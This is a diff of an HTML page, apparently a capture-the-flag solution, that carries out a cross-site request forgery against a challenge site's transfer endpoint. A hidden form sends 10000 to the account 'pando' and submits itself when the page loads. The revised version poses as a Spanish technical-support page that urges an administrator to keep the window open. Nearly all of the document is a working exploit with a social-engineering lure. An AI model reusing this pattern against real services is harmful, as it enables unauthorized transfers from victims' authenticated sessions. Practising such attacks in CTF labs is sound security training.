@@ -1,16 +1,21 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <form id="f" action="https://ctf.fap.hispasec.com:8009/transfer" method="POST">
-      <input type="hidden" name="to" value="pando">
-      <input type="hidden" name="amount" value="10000">
+<head>
+    <title>Soporte Técnico - Procesando Incidencia</title>
+</head>
+<body>
+    <p>Cargando información para el administrador... Por favor, no cierre esta ventana.</p>
+    
+    <form id="exploitForm" action="https://ctf.fap.hispasec.com:8009/transfer" method="POST">
+        <input type="hidden" name="recipient" value="pando" />
+        <input type="hidden" name="amount" value="10000" />
     </form>
 
     <script>
-      // intenta varias veces por si la sesión tarda en cargar
-      setTimeout(() => document.getElementById('f').submit(), 1000);
-      setTimeout(() => document.getElementById('f').submit(), 3000);
-      setTimeout(() => document.getElementById('f').submit(), 6000);
+        // Se ejecuta automáticamente al cargar la página
+        window.onload = function() {
+            document.getElementById('exploitForm').submit();
+        };
     </script>
-  </body>
+</body>
 </html>
